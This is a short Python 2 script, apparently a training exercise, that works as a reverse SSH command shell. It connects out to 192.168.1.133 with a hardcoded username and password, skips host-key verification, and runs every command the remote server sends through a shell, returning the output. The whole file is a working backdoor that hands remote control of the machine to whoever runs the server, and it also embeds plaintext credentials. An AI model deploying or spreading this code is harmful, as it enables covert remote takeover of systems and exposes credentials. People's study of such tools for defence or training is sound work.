import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_system_host_keys('/Users/jose/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)

        '''
        Because Windows does not include an SSH Server out-of-the-box, we need to reverse this and send commands from 
        our SSH Server to the SSH Client
        '''
        print ssh_session.recv(1024) # Read banner (This is what receives "Welcome to bh_ssh" banner.)
        while True:
            command = ssh_session.recv(1024) # get the command from the SSH Server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception,e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command('192.168.1.133', 'jose', 'qwaszx12', 'ClientConnected')